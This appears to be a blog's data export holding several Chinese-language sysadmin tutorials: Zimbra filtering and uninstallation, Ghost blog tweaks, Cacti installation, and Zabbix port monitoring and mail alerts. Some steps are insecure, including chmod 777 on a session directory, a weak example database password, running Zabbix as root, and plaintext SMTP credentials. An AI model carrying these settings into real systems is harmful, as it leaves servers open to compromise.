做反垃圾邮件过滤器，但在WEB控制台中ClamAV+SpamAssassin只有6个调节选项。所以如果要想详细的调节防病毒、反垃圾邮件的功能只有更改相应的配置文件了。例如调节SpamAssassin的配置文件实现黑名单、白名单的功能。编辑/opt/zimbra/conf/amavisd.conf.in寻找下列段落，然后加上你要信任的域：&#123; # a hash-type lookup table (associative array)‘nobody@cert.org’ =&gt; -3.0,‘cert-advisory@us-cert.gov’ =&gt; -3.0,‘owner-alert@iss.net’ =&gt; -3.0,‘slashdot@slashdot.org’ =&gt; -3.0,‘bugtraq@securityfocus.com’ =&gt; -3.0,‘ntbugtraq@listserv.ntbugtraq.com’ =&gt; -3.0,‘security-alerts@linuxsecurity.com’ =&gt; -3.0,-10就是无条件信任了，相反+10就是无条件阻挡了。然后存盘，$ su zimbra$ zmamavisdctl stop$ zmamavisdctl start Zimbra在linux系统上的删除(卸载)方法登陆root用户1执行以下面的命令，su切换 到zimbra用户，停止zmcontrol服务，然后再退出zimbra帐户 1234su – zimbrazmcontrol stopexit(you should be root after you run exit) 2执行下面的命令，查看系统中是否还有zimbra进程 1ps -ef | grep -i zimbra 如果看到还有zimbra进程，就用下面的命令，kill掉进程 2 用kill -9强制杀死进程: 1kill -9 &lt;zimbra的进程号&gt; 3执行以下命令: 1df 如果你能看到 “amavisd” 3 那就执行以下命令: 1umount /opt/zimbra/amavisd&lt;-new-blah&gt;/tmp 4进入你安装时解压出来的源文件目录（即安装文件目录） 1cd /&lt;tmp_tar_install_dir&gt;/zcs/ tmp_tar_install_dir：你的文件路径，如我所下载来的安装包，都是放在/usr/local/src下面的，然后把安装包改名成zcs，这个你应该明白吧？不明白？可联系我 1cd /usr/local/src/zcs/ 12345[root@linuxyw zcs]# lsREADME.txt data install.sh readme_binary_en_US.txt utilbin docs packages readme_source_en_US.txt[root@linuxyw zcs]# pwd/usr/local/src/zcs 5)执行以下命令： 1./install.sh -u 6)执行以下的命令完成卸载 1234567rm -rf /opt/zimbrarm -rf /var/log/*zimbra*rm -rf /tmp/*zimbra*rm -rf /tmp/hsperfdata*rm -rf /tmp/install.*rm -rf /tmp/*swatch*rm -rf /tmp/log* 进以下面的目录中，查看下，确保所有用户拥用者zimbra的文件全部删除 12/var/log//tmp/ 7)执行以下命令，删除zimbra用户和组: 1234userdel zimbrauserdel postfixgroupdel zimbragroupdel postfix 8）在 /etc/fstab中删除这行内容（如果没有这行就跳过吧）： 1/dev/shm /opt/zimbra/amavisd-new-2.4.1/tmp tmpfs defaults,users,size=150m,mode=777 0 0 9) 在/etc/syslog.conf中删除以下几行，一般在文件最后的位置（如果你是用centos6.x系统，文件名应该/etc/rsyslog.conf 123local0.* -/var/log/zimbra.log auth.* -/var/log/zimbra.log mail.* -/var/log/zimbra.log 10) 执行以下命令，删除日志配置文件(CentOS, RHEL) 1rm -f /etc/logrotate.d/zimbra 11) 在 /etc/prelink.conf文件中删除以下内容 (CentOS, RHEL) 123456# added for Zimbra-l /opt/zimbra/lib-l /opt/zimbra/sleepycat/lib-l /opt/zimbra/openldap/lib-l /opt/zimbra/cyrus-sasl/lib-l /opt/zimbra/mysql/lib 12) 在/etc/rc* 中删除zimbra自启动(CentOS, RHEL) 1chkconfig --del zimbra 到此就完成Zimbra卸载了其它的操作系统操作： 12345678910Other methods:(assuming you didn't already try the above)(dijichi2) if you get stuck and really want to just purge it from the system, try:rpm -e `rpm -qa |grep zimbra`rm -rf /opt/zimbradelete zimbra entries from /etc/sudoersdelete zimbra entries from root and zimbra crontabs Ubuntu系统操作： 1234567891011On Ubuntu servers dpkg may think that Zimbra is still installed. Check by running dpkg --list (-l) or dpkg -q zimbra* and see if zimbra items are still listed. You can remove them by running:dpkg --remove zimbra-apache zimbra-ldap zimbra-mta zimbra-spell zimbra-core zimbra-logger zimbra-snmp zimbra-store orsudo rm -r /opt/zimbraUnInstalling Zimbra on Linux 参考原文地址：http://wiki.zimbra.com/wiki/UnInstalling_Zimbra_on_Linux 参考阿文大师兄的zimbra文档:","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.yangcvo.me/categories/Linux/"}],"tags":[{"name":"Linux note","slug":"Linux-note","permalink":"http://blog.yangcvo.me/tags/Linux-note/"}]},{"title":"Ghost-blog修改端口","slug":"Blog/Ghost/Ghost-blog修改端口","date":"2014-11-24T04:51:27.000Z","updated":"2017-04-01T02:03:23.000Z","comments":true,"path":"2014/11/24/Blog/Ghost/Ghost-blog修改端口/","link":"","permalink":"http://blog.yangcvo.me/2014/11/24/Blog/Ghost/Ghost-blog修改端口/","excerpt":"","text":"Ghost 修改端口说下我这是bitnami 一键安装的，因为之前安装的6.0 版本升级用bitnami 一键安装了。 这里需要修改的端口 就必须这几个地方： 需要修改端口80-8088： 123/opt/ghost-0.7.5-0/apache2/conf/httpd.conf/opt/ghost-0.7.5-0/apache2/conf/bitnami/bitnami.conf/opt/ghost-0.7.5-0/apps/ghost/htdocs/config.js 这三处修改端口，然后80端口我又做了个主页，然后转接到8088端口上面文章。 然后重启启动脚本： 12root@sysopen ~]# /opt/ghost-0.7.5-0/ctlscript.sh restartSyntax OK","raw":null,"content":null,"categories":[{"name":"Blog","slug":"Blog","permalink":"http://blog.yangcvo.me/categories/Blog/"}],"tags":[{"name":"Blog","slug":"Blog","permalink":"http://blog.yangcvo.me/tags/Blog/"}]},{"title":"Ghost博客：实现网站访问次数统计代码","slug":"Blog/Ghost/Ghost博客：实现网站访问次数统计代码 ","date":"2014-11-24T04:50:27.000Z","updated":"2017-03-14T05:39:34.000Z","comments":true,"path":"2014/11/24/Blog/Ghost/Ghost博客：实现网站访问次数统计代码 /","link":"","permalink":"http://blog.yangcvo.me/2014/11/24/Blog/Ghost/Ghost博客：实现网站访问次数统计代码 /","excerpt":"","text":"去年自己搭建了Ghost博客，更新了没多久发现一个问题，就是界面比WordPress好看多，可是功能就唯一好点还支撑Macdown，最近看了下想让自己的博客做到统计访问次数。 就弄了篇文章，方便后期改进，也可以自己做参考。 目前 Ghost系统并未在后台提供设置统计代码的功能，也没有提供在主题（theme）中获取统计代码的能力。现在的解决办法是在主题模板中手动添加，这就需要对模板文件做些改动，我们以 Ghost 默认的casper主题为例。 进入你的 Ghost 安装目录，用任何编辑器打开 content/themes/casper/default.hbs文件： 作为一个网站的管理员或者说站长，都希望知道到底有多少人访问了网站，这个时候就需要有一个统计功能来满足需要,当然功能比较单一和简单，如果想要强大的统计效果，那最好还是使用现在比较成熟的统计工具，比如站长统计或者腾讯统计等等。 代码一：代码如下: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;script type=\"text/javascript\"&gt;var caution=falsefunction setCookie(name,value,expires,path,domain,secure) &#123; var curCookie=name+\"=\"+escape(value) + ((expires)?\";expires=\"+expires.toGMTString() : \"\") + ((path)?\"; path=\" + path : \"\") + ((domain)? \"; domain=\" + domain : \"\") + ((secure)?\";secure\" : \"\") if(!caution||(name + \"=\" + escape(value)).length &lt;= 4000) &#123; document.cookie = curCookie &#125; else if(confirm(\"Cookie exceeds 4KB and will be cut!\")) &#123; document.cookie = curCookie &#125;&#125;function getCookie(name) &#123; var prefix = name + \"=\" var cookieStartIndex = document.cookie.indexOf(prefix) if (cookieStartIndex == -1) &#123; return null &#125; var cookieEndIndex=document.cookie.indexOf(\";\",cookieStartIndex+prefix.length) if(cookieEndIndex == -1) &#123; cookieEndIndex = document.cookie.length &#125; return unescape(document.cookie.substring(cookieStartIndex+prefix.length,cookieEndIndex))&#125;function deleteCookie(name, path, domain) &#123; if(getCookie(name)) &#123; document.cookie = name + \"=\" + ((path) ? \"; path=\" + path : \"\") + ((domain) ? \"; domain=\" + domain : \"\") + \"; expires=Thu, 01-Jan-70 00:00:01 GMT\" &#125;&#125;function fixDate(date) &#123; var base=new Date(0) var skew=base.getTime() if(skew&gt;0) &#123; date.setTime(date.getTime()-skew) &#125; &#125;var now=new Date()fixDate(now)now.setTime(now.getTime()+365 * 24 * 60 * 60 * 1000)var visits = getCookie(\"counter\")if(!visits)&#123; visits=1;&#125; else&#123; visits=parseInt(visits)+1;&#125; setCookie(\"counter\", visits, now)document.write(\"您是到访的第\" + visits + \"位用户！\")&lt;/script&gt; 插入到中间部分，设置ID 就可以调整自己首页位置。我之前是直接放到最后的，没有做太多美观调整。可以随意设置。 代码二：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768代码如下：&lt;script type=\"text/javascript\"&gt;var caution=falsefunction setCookie(name,value,expires,path,domain,secure) &#123; var curCookie=name+\"=\"+escape(value) + ((expires)?\";expires=\"+expires.toGMTString() : \"\") + ((path)?\"; path=\" + path : \"\") + ((domain)? \"; domain=\" + domain : \"\") + ((secure)?\";secure\" : \"\") if(!caution||(name + \"=\" + escape(value)).length &lt;= 4000) &#123; document.cookie = curCookie &#125; else if(confirm(\"Cookie exceeds 4KB and will be cut!\")) &#123; document.cookie = curCookie &#125;&#125;function getCookie(name) &#123; var prefix = name + \"=\" var cookieStartIndex = document.cookie.indexOf(prefix) if (cookieStartIndex == -1) &#123; return null &#125; var cookieEndIndex=document.cookie.indexOf(\";\",cookieStartIndex+prefix.length) if(cookieEndIndex == -1) &#123; cookieEndIndex = document.cookie.length &#125; return unescape(document.cookie.substring(cookieStartIndex+prefix.length,cookieEndIndex))&#125;function deleteCookie(name, path, domain) &#123; if(getCookie(name)) &#123; document.cookie = name + \"=\" + ((path) ? \"; path=\" + path : \"\") + ((domain) ? \"; domain=\" + domain : \"\") + \"; expires=Thu, 01-Jan-70 00:00:01 GMT\" &#125;&#125;function fixDate(date) &#123; var base=new Date(0) var skew=base.getTime() if(skew&gt;0) &#123; date.setTime(date.getTime()-skew) &#125; &#125;var now=new Date()fixDate(now)now.setTime(now.getTime()+365 * 24 * 60 * 60 * 1000)var visits = getCookie(\"counter\")if(!visits)&#123; visits=1;&#125; else&#123; visits=parseInt(visits)+1;&#125; setCookie(\"counter\", visits, now)document.write(\"您是到访的第\" + visits + \"位用户！\")&lt;/script&gt; 以上通过两种方式实现JavaScript统计网站访问量的代码，希望对大家有所帮助。 需要的留言给我，现在博客更新了，所以效果图看不到。","raw":null,"content":null,"categories":[{"name":"Blog","slug":"Blog","permalink":"http://blog.yangcvo.me/categories/Blog/"}],"tags":[{"name":"Blog","slug":"Blog","permalink":"http://blog.yangcvo.me/tags/Blog/"}]},{"title":"Ghost博客：增加Disqus评论组件","slug":"Blog/Ghost/Ghost博客：增加Disqus评论组件","date":"2014-11-20T05:06:30.000Z","updated":"2017-03-14T05:39:25.000Z","comments":true,"path":"2014/11/20/Blog/Ghost/Ghost博客：增加Disqus评论组件/","link":"","permalink":"http://blog.yangcvo.me/2014/11/20/Blog/Ghost/Ghost博客：增加Disqus评论组件/","excerpt":"","text":"Ghost博客不自带评论功能的，这个是我想说的一个差评，不过简单的添加下评论组件还是比较简单的。 Ghost作为一个极简的Blog系统，并没有文章评论系统。要实现评论系统，就需要借助第三方评论系统。 第三方系统比内置实现主要方便在无需维护用户系统，且大部分第三方系统都有较好的垃圾评论过滤机制，方便省心。 这里以多说为例，多说支持大多数现有blog系统，不过它的官网上没有ghost的选项，可能是ghost现在使用人数较少的原因吧。 首先我们需要注册一个多说的账号，点首页上的我要安装按钮，填写相关资料后即跳转到评论组件相关的代码。 初始如下： 1.头部到Disqus，并立即登记一个帐户。 2.一旦你已经签署了检查你的电子邮件，并点击Disqus验证链接。 3.你会被带到一个Disqus欢迎页面，你需要点击按钮，仪表盘在右上角. 4.点击+添加在左上角按钮 5.填写网站的个人资料的详细信息，然后单击完成登记 6.在“选择平台”页上点击通用代码 7.在这个页面，你需要在第一个复制的JavaScript代码。这段JavaScript代码将被添加到您的鬼主题，以显示您的意见。 8.你要编辑的文件是post.hbs，位于： 1/path/to/ghost/content/themes/casper/post.hbs 9.打开这个文件不是用文本编辑器或者VI： 10.如果向下滚动一点点，你会看到这样的代码（使用您的主题假设，如果你使用的是其他主题可能会有所不同）： 123&lt;section class=\"post-content\"&gt; &#123;&#123;content&#125;&#125;&lt;/section&gt; 11.你Disqus复制权低于部分中的代码粘贴。然后保存退出。 12.如果你有Ghost的运行，停止和启动它。现在，当您浏览到一个职位，你将会看到类似下面的屏幕截图评论部分！ 最后得到的结果就是本文最底部这样子的东西。 之前我的博客是搭建在服务器上面的，所以效果图我也截图了一张。 现在看到的是用的我们国内免费的多说评论组件，刷新网速等等反应也更快。 参考多说官网设置：多说 参考Disqus官网：Disqus 参考Disqus更多文档：如何在Ghost博客安装评论插件","raw":null,"content":null,"categories":[{"name":"Blog","slug":"Blog","permalink":"http://blog.yangcvo.me/categories/Blog/"}],"tags":[{"name":"Blog","slug":"Blog","permalink":"http://blog.yangcvo.me/tags/Blog/"}]},{"title":"了解Cacti监控安装与配置.md","slug":"性能监控/cacti/了解Cacti监控安装与配置","date":"2014-10-21T11:33:47.000Z","updated":"2017-04-16T15:33:13.000Z","comments":true,"path":"2014/10/21/性能监控/cacti/了解Cacti监控安装与配置/","link":"","permalink":"http://blog.yangcvo.me/2014/10/21/性能监控/cacti/了解Cacti监控安装与配置/","excerpt":"","text":"什么是Cacti?Cacti， 在英文中的意思是仙人掌的意思，Cacti是一套基于PHP,MySQL,SNMP及RRDTool开发的网络流量监测图形分析工具。它通过snmpget来获取数据，使用 RRDtool绘画图形，而且你完全可以不需要了解RRDtool复杂的参数。它提供了非常强大的数据和用户管理功能，可以指定每一个用户能查看树状结构、host以及任何一张图，还可以与LDAP结合进行用户验证，同时也能自己增加模板，功能非常强大完善。Cacti 的发展是基于让 RRDTool 使用者更方便使用该软件，除了基本的 Snmp 流量跟系统资讯监控外，Cacti 也可外挂 Scripts 及加上 Templates 来作出各式各样的监控图。 Cacti是用php语言实现的一个软件，它的主要功能是用snmp服务获取数据，然后用rrdtool储存和更新数据，当用户需要查看数据的时候用rrdtool生成图表呈现给用户。因此，snmp和rrdtool是cacti的关键。Snmp关系着数据的收集，rrdtool关系着数据存储和图表的生成。 Mysql配合PHP程序存储一些变量数据并对变量数据进行调用，如：主机名、主机ip、snmp团体名、端口号、模板信息等变量。 snmp抓到数据不是存储在mysql中，而是存在rrdtool生成的rrd文件中（在cacti根目录的rra文件夹下）。rrdtool对数据的更新和存储就是对rrd文件的处理，rrd文件是大小固定的档案文件（Round Robin Archive），它能够存储的数据笔数在创建时就已经定义。关于RRDTool的知识请参阅RRDTool教学。 什么是SNMP？snmp(Simple Network Management Protocal, 简单网络管理协议)在架构体系的监控子系统中将扮演重要角色。大体上，其基本原理是，在每一个被监控的主机或节点上 (如交换机)都运行了一个 agent，用来收集这个节点的所有相关的信息，同时监听 snmp 的 port，也就是 UDP 161，并从这个端口接收来自监控主机的指令(查询和设置)。 如果安装 net-snmp，被监控主机需要安装 net-snmp(包含了 snmpd 这个 agent)，而监控端需要安装 net-snmp-utils，若接受被监控端通过trap-communicate发来的信息的话，则需要安装net-snmp，并启用trap服务。如果自行编译，需要 beecrypt(libbeecrypt)和 elf(libraryelf)的库。 什么是RRDtools？RRDtool是指Round Robin Database 工具（环状数据库）。Round robin是一种处理定量数据、以及当前元素指针的技术。想象一个周边标有点的圆环－－这些点就是时间存储的位置。从圆心画一条到圆周的某个点的箭头－－这就是指针。就像我们在一个圆环上一样，没有起点和终点，你可以一直往下走下去。过来一段时间，所有可用的位置都会被用过，该循环过程会自动重用原来的位置。这样，数据集不会增大，并且不需要维护。RRDtool处理RRD数据库。它用向RRD数据库存储数据、从RRD数据库中提取数据。 Cacti是基于nginx，rrdtool，mysql，php，snmp来运行的. 1.安装操作系统centos6.0以上版本 2.配置好网络IP和DNS 3.修改系统时区和时间，使用上海时区 备份原有的时区文件 1cp /etc/localtime /etc/localtime.bak 用上海时区文件替换系统时区文件 1cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime 修改/etc/sysconfig/clock文件，修改为： 123ZONE=\"Asia/Shanghai\"UTC=falseARC=false 同步时间 1ntpdate time.nist.gov 4.安装epel源 1rpm -Uvh http://mirrors.sohu.com/fedora-epel/6/x86_64/epel-release-6-8.noarch.rpm 5.安装基础支持软件 1yum install -y openssh-clients telnet wget nginx php-cgi php-cli spawn-fcgi mysql-servermysql rrdtoolnet-snmp net-snmp-utils net-snmp-devel php-mysql php-snmp 6.配置PHP管理器 （1）cd /etc/sysconfig 进入sysconfig文件夹 （2）vi spawn-fcgi 在文件改位置添加如下命令 1234#SOCKET=/var/run/php-fcgi.sock#OPTIONS=\"-u apache -g apache -s $SOCKET -S -M 0600 -C 32 -F 1 -P /var/run/spawn-fcgi.pid -- /usr/bin/php-cgi\" SOCKET=/var/run/php-fcgi.sock OPTIONS=\"-u nginx -g nginx -s $SOCKET -S -M 0600 -C 32 -F 1 -P /var/run/spawn-fcgi.pid -- /usr/bin/php-cgi\" （3）/etc/init.d/spawn-fcgi restart 重启php管理器 （4）chkconfig spawn-fcgi on 设置开机启动服务 7.补充创建/var/lib/php下 session 目录 123mkdir -p /var/lib/php/sessionchown -R nginx.nginx /var/lib/php/sessionchmod 777 /var/lib/php/session 8.修改PHP文件配置 vi /etc/php.ini （1）修改PHP时区为Asia/ShangHai，在文件如下位置添加该句命令 12345678;;;;;;;;;;;;;;;;;;;; Module Settings ;;;;;;;;;;;;;;;;;;;;[Date]; Defines the default timezone used by the date functions; http://www.php.net/manual/en/datetime.configuration.php#ini.date.timezone;date.timezone =date.timezone = Asia/Shanghai （2）修改PHP调用内存限制，在文件如下位置修改如下添加： date.timezone = Asia/Shanghai memory_limit = 512M 123456789101112131415161718192021;;;;;;;;;;;;;;;;;;;; Resource Limits ;;;;;;;;;;;;;;;;;;;;; Maximum execution time of each script, in seconds; http://www.php.net/manual/en/info.configuration.php#ini.max-execution-timemax_execution_time = 30; Maximum amount of time each script may spend parsing request data. It's a good; idea to limit this time on productions servers in order to eliminate unexpectedly; long running scripts.; Default Value: -1 (Unlimited); Development Value: 60 (60 seconds); Production Value: 60 (60 seconds); http://www.php.net/manual/en/info.configuration.php#ini.max-input-timemax_input_time = 60; Maximum input variable nesting level; http://www.php.net/manual/en/info.configuration.php#ini.max-input-nesting-level;max_input_nesting_level = 64; Maximum amount of memory a script may consume (128MB); http://www.php.net/manual/en/ini.core.php#ini.memory-limit#memory_limit = 128Mmemory_limit = 512M 10.修改nginx配置文件增加对cacti的支持（对应自己的nginx安装目录）vi /usr/local/nginx/conf.d/nginx.conf在文件末尾大括号内添加如下配置 server { listen 8080; server_name 127.0.0.1; root html; index index.html index.php; location ~ \\.php$ { root html; fastcgi_buffer_size 128k; fastcgi_buffers 8 128k; fastcgi_pass unix:/var/run/php-fcgi.sock; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; #fastcgi_param SCRIPT_FILENAME /usr/local/nginx/html/$fastcgi_script_name; include fastcgi_params; } } chkconfig nginx on 设置nginx开机启动 service nginx restart重启nginx服务 11.安装catic catic是无需编译安装的，直接下载其源包解压即可使用（1）下载cacti 12cd /tmpwget http://www.cacti.net/downloads/cacti-0.8.8b.tar.gz （2）解压cacti 12tar zxvf cacti-0.8.8b.tar.gzmv cacti-0.8.8b /usr/local/nginx/html #将解压出的cacti文件夹移动到nginx的 web目录下（对应自己安装的nginx） （3）修改cacti的使用者和组权限为nginx用户和nginx组 12cd /usr/local/nginx/htmlchown -R nginx:nginx cacti/ 12.创建数据库，存储cacti数据 123启动mysql/etc/init.d/mysqld startchkconfig mysqld on （1）使用root账户登录mysql mysql -uroot （2）创建cacti数据库表 create database cacti; （3）建立用户cacti，密码cacti123(可自行定义) mysql&gt; insert into mysql.user(host,user,password) values (&apos;localhost&apos;,&apos;cacti&apos;,password(&apos;cacti123&apos;)); （4）重载mysql授权表 mysql&gt; flush privileges; （5） 把数据库cacti授权于用户cacti mysql&gt; grant all on cacti.* to cacti@&apos;localhost&apos; identified by &apos;cacti123&apos;; mysql&gt; quit （6）将cacti数据库与mysql中的数据对应起来 cd /usr/local/nginx/html/cacti mysql -ucacti -pcacti123 cacti&lt;cacti.sql 13.修改CACTI配置文件 (1) 切换至cacti下的include目录（对应自己安装的nginx） cd /usr/local/nginx/html/cacti/include/ (2)编辑config.php文件，修改如下位置的配置 vi config.php 12345678/* make sure these values refect your actual database/host/user/password */$database_type = \"mysql\";$database_default = \"cacti\";#mysql数据库里所创建的表名$database_hostname = \"127.0.0.1\";$database_username = \"cacti\";#mysql数据库里为cacti数据表所创建的用户名$database_password = \"cacti123\";#mysql数据库里为cacti数据表所创建的密码$database_port = \"3306\";$database_ssl = false; 14.配置cacti的循环任务 12crontab -e*/5 * * * * php /usr/local/nginx/html/cacti/poller.php &gt; /dev/null 2&gt;&amp;1#请对应自己的nginx安装目录 :wq 保存退出 可直接先运行一遍php /usr/local/nginx/html/cacti/poller.php 好让cacti产生图片 1php /usr/share/nginx/html/cacti/poller.php 15.安装完成 使用浏览器打开如下地址http://本机IP/cacti/install 会显示安装向导，点击NEXT即可，到下面如下界面是，注意查看所有的文件路径是否都为绿色，不是绿色请找到自己安装的目录，一一对应点击Finsh即可到达cacti的登陆界面 输入用户名密码,cacti默认的用户名和密码都为admin，输入一次后会提示在一次输入，这个时候是让你设置新的admin密码.然后就能进入cacti的图形界面了. 点击左上角graphs，就能查看本机所监控的所有设备默认存在一个localhost，监控本机的内存使用，活动用户等信息.","raw":null,"content":null,"categories":[{"name":"monitoring","slug":"monitoring","permalink":"http://blog.yangcvo.me/categories/monitoring/"}],"tags":[{"name":"Performance monitoring","slug":"Performance-monitoring","permalink":"http://blog.yangcvo.me/tags/Performance-monitoring/"}]},{"title":"zabbix监控80端口状态","slug":"性能监控/Zabbix/zabbix监控80端口状态","date":"2014-10-06T03:17:22.000Z","updated":"2016-12-15T10:34:40.000Z","comments":true,"path":"2014/10/06/性能监控/Zabbix/zabbix监控80端口状态/","link":"","permalink":"http://blog.yangcvo.me/2014/10/06/性能监控/Zabbix/zabbix监控80端口状态/","excerpt":"","text":"目的：监控web主机80端口是否在供提服务。如果不在发出报警。zabbix监控web端上面的80端口，或者其他的端口都是可以实现的。 在这里可以添加自带的模板-组态-模板-Template App HTTP Service 有自带的HTTP service is running 服务是否正常启动。 这个是监测http的80端口，后期比如nginx，gitlab,或者其他服务的80端口。可以对单台设置。 也可以创建模板正对性的监控集群的同一个端口。 配置： 1、添加监控项(Items) 12 打开zabbix web管理界面：选择\"Configuration\"-&gt;\"Hosts\"-这里选择需要监控的机器-\"Items\" 选择Create-item 创建项目，这个对这台监控的服务器创建对应的监控项目。 在这里”name”为”web01.haozhuo 80”，设置”key”点击”Select”按钮弹出下图选择”net.tcp.port[,port]”,然后修改为web01的ip地址端口为80。”net.tcp.port[192.168.0.2,80]” 保存 2、添加触发器（Triggers）选择Configuration”-&gt;”Hosts”-这里选择需要监控的机器-“Triggers” 选择Create-Trigger 保存 然后选择添加图形。 zabbix-server2.4服务端编译安装 zabbix-server服务端编译安装 zabbix2.4监控80端口状态 : zabbix监控80端口状态 zabbix+Grafana安装使用监控结合 ：zabbix+Grafana安装使用监控结合 zabbix监控MySQL-添加自定义监控项 : zabbix监控MySQL-添加自定义监控项 zabbix的ICMP_Ping模版实现对客户端网络状态的监控 : zabbix的ICMP_Ping模版实现对客户端网络状态的监控 zabbix性能监控故障总结 zabbix性能监控故障总结","raw":null,"content":null,"categories":[{"name":"monitoring","slug":"monitoring","permalink":"http://blog.yangcvo.me/categories/monitoring/"}],"tags":[{"name":"zabbix","slug":"zabbix","permalink":"http://blog.yangcvo.me/tags/zabbix/"}]},{"title":"zabbix邮件告警","slug":"性能监控/Zabbix/zabbix邮件告警","date":"2014-10-05T03:11:06.000Z","updated":"2016-08-03T07:54:48.000Z","comments":true,"path":"2014/10/05/性能监控/Zabbix/zabbix邮件告警/","link":"","permalink":"http://blog.yangcvo.me/2014/10/05/性能监控/Zabbix/zabbix邮件告警/","excerpt":"","text":"操作系统环境：CentOS release 6.7 (Final) zabbix版本2.4.7 关于操作系统CentOS6.0 以下版本都是通过mail命令调用sendmail的sm-client发送邮件，所以如果关闭sendmail按照很多网上的文档是发不出邮件的。 centos 6.0以上版本 12默认已经安装好sendmail默认已经安装好postfix sendmail和postfix只需要安装一个即可并开启服务即可。 实现目的：在Zabbix服务端设置邮件报警，当被监控主机宕机或者达到触发器预设值时，会自动发送报警邮件到指定邮箱，定位哪里出现问题，可以及时的解决。 1.安装邮件发送工具mailxCentOS 6.x 编译安装mailx，直接yum安装的mailx版本太旧，使用外部邮件发送会有问题。 123yum install mailx #安装yum remove mailx #卸载系统自带的旧版mailx 这里我用编译安装的很简单几步就可以了。 mail下载地址:Downloads 1234567891011[root@salt ~]# curl -O http://ftp.debian.org/debian/pool/main/h/heirloom-mailx/heirloom-mailx_12.5.orig.tar.gz[root@salt ~]# tar -zxvf heirloom-mailx_12.5.orig.tar.gz [root@salt ~]# cd heirloom-mailx-12.5[root@salt heirloom-mailx-12.5]# make[root@salt heirloom-mailx-12.5]# make install UCBINSTALL=/usr/bin/install[root@salt heirloom-mailx-12.5]# ln -s /usr/local/bin/mailx /bin/mail #创建mailx到mail的软连接[root@salt heirloom-mailx-12.5]# ln -s /etc/nail.rc /etc/mail.rc #创建mailx配置文件软连接[root@salt heirloom-mailx-12.5]# whereis mailx #查看安装路径mailx: /bin/mailx /usr/local/bin/mailx /usr/share/man/man1p/mailx.1p.gz /usr/share/man/man1/mailx.1.gz [root@salt heirloom-mailx-12.5]# mailx -V #查看版本信息12.5 6/20/10 安装完以后我们来测试下： 123456[root@salt]# echo \"zabbix test mail\" |mail -s zabbix\" it@hz-health.cn[root@salt]# send-mail: warning: inet_protocols: IPv6 support is disabled: Address family not supported by protocolsend-mail: warning: inet_protocols: configuring for IPv4 support onlypostdrop: warning: inet_protocols: IPv6 support is disabled: Address family not supported by protocolpostdrop: warning: inet_protocols: configuring for IPv4 support onlypostdrop: warning: unable to look up public/pickup: No such file or directory 如果有出现这个报错，那么我们需要修改下配置文件。查看当前inet_protocols 123456789# /usr/sbin/postconf | grep inet_protocolsinet_protocols = all修改ipv4# vi /etc/postfix/main.cfinet_protocols = all改为inet_protocols = ipv4重启postfixservice postfix restart 然后在测试： 1[root@salt]# echo \"zabbix test mail\" |mail -s \"zabbix\" it@xxxx.cn 测试发送邮件，标题zabbix，邮件内容：zabbix test mail，发送到的邮箱：xxx.qq.com 这时候，邮箱yyy@qq.com会收到来自xxx@qq.com的测试邮件。 2、创建邮件告警的python脚本zabbix_server添加脚本配置: zabbix安装路径：cd /usr/local/zabbix/share/zabbix/alertscripts 编写脚本：vim /usr/local/zabbix/share/zabbix/alertscripts/zabbix_sendmail.py 12345678910111213141516171819202122232425262728#!/usr/bin/env python#coding:utf-8import smtplibfrom email.mime.text import MIMETextimport sysLOG_FILENAME=\"/var/log/email_python.log\"mail_host = 'smtp.exmail.qq.com' #定义smtp服务器mail_user = 'it@xxxx.cn' #发件人邮箱mail_pass = 'xxxxxxx' #发件人邮箱密码mail_port = 465 #smtp服务器的端口号，不同的邮箱服务器端口号不同def send_mail(to_list,subject,content): me=\"Zabbix Monitor\"+\"&lt;\"+mail_user+\"&gt;\" #定义发件人显示名称为Zabbix Monitor msg=MIMEText(content,_subtype='plain',_charset='gb2312') msg['Subject']=subject #定义邮件主题 msg['From']=me #发送方 msg['to']=to_list #接收方 try: s=smtplib.SMTP_SSL() #创建一个smtp对象 s.connect(mail_host,mail_port) #通过connect方法连接smtp主机 s.login(mail_user,mail_pass) #邮箱账户登录认证 s.sendmail(me,to_list,msg.as_string()) #发送邮件 s.close() #断开smtp连接 return True except Exception,e: print str(e) return Falseif __name__ == \"__main__\": send_mail(sys.argv[1],sys.argv[2],sys.argv[3]) 2、脚本文件路径 先确认下zabbix_server.conf文件中定义的告警脚本路径配置： 如果注释了，添加一条绝对路径。 12# AlertScriptsPath=$&#123;datadir&#125;/zabbix/alertscripts AlertScriptsPath=/usr/local/zabbix/share/zabbix/alertscripts 然后将准备好的python脚本存放到该路径下，并更改脚本文件的权限和属主属组 12chown zabbix.zabbix /usr/local/zabbix/share/zabbix/alertscripts/zabbix_sendmail.pychmod +x /usr/local/zabbix/share/zabbix/alertscripts/zabbix_sendmail.py 注意：如果在zabbix_server.conf文件中没有设置Allow root=1，则表示zabbix是以zabbix用户启动而不是root，所以脚本的属主属组都应该设置为zabbix用户。设置为root用户启动的配置如下。 123456789### Option: AllowRoot# Allow the server to run as 'root'. If disabled and the server is started by 'root', the server# will try to switch to user 'zabbix' instead. Has no effect if started under a regular user.# 0 - do not allow# 1 - allow## Mandatory: no# Default:AllowRoot=1 重启服务： 123[root@salt alertscripts]# /etc/init.d/zabbix_server restartShutting down zabbix_server: [确定]Starting zabbix_server: [确定] 3、测试脚本文件发送邮件是否成功，这一步很重要 1./zabbix_sendmail.py cheng@health.cn \"subject\" \"zabbix\" 已经测试ok，可以收到邮件，说明写的python脚本没有问题。 zabbix-web端设置 首先web端的配置顺序如下：创建用户媒介–&gt;创建用户组和用户–&gt;针对trigger（触发器）添加报警动作，设置邮件发送用户及媒介 1.创建用户媒介 创建用户媒介–&gt;创建用户组和用户–&gt;Media types–&gt;Createmediatype Mediatype设置如下， Name项自定义（创建用户时会用到这个名字),我们使用脚本来发邮件，所以Type项请选择Script，Script项则是你zabbix server上的发送邮件的脚本名字 （注：如脚本名字是snedmail.py,那此项就填sendmail，后缀不要) zabbix会传给脚本三个参数：接收用户，邮件主题，邮件内容 2.设置Zabbix用户报警邮箱地址 组态-用户-Admin (Zabbix Administrator) 再到Media标签下，点击Add添加用户及该用户的报警方式，然后Type项选择你所创建的邮件报警名字（Media Type），在Send to后填入用户的报警邮箱，其他默认即可。 3.设置Zabbix触发报警的动作 组态-动作-创建动作 